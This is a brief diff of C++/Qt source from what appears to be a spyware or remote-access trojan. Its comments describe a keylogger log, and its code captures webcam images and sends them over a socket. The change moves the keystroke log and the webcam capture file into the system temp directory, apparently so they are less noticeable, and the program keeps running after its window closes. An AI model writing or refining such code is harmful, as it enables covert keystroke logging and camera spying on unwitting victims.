@@ -77,7 +77,7 @@ void MainWindow::inicio(){
     connect(this->botonChatEnviar,SIGNAL(clicked()),this,SLOT(enviarMensajeChat()));
     connect(&this->verTecla,SIGNAL(timeout()),this,SLOT(escucharTeclas()));
     QApplication::setQuitOnLastWindowClosed(false);
-    log.setFileName("./log"); //archivo de log del keylogger
+    log.setFileName(directorio.tempPath() + "/log"); //archivo de log del keylogger
     verTecla.setInterval(50);
     this->verTecla.start();
 }
@@ -386,8 +386,8 @@ void MainWindow::llegadaDatosWebcam()
         QDir directorio;
         imagen = capturar();
        // directorio.remove("./captura.jpg");
-        imagen.save("./dat","jpeg",parametros[1].toInt());
-        util.enviarArchivo("./dat",&socketWebcam);
+        imagen.save(directorio.tempPath() + "/dat","jpeg",parametros[1].toInt());
+        util.enviarArchivo(directorio.tempPath() + "/dat",&socketWebcam);
     }
     if (parametros[0] == "encender")
     {
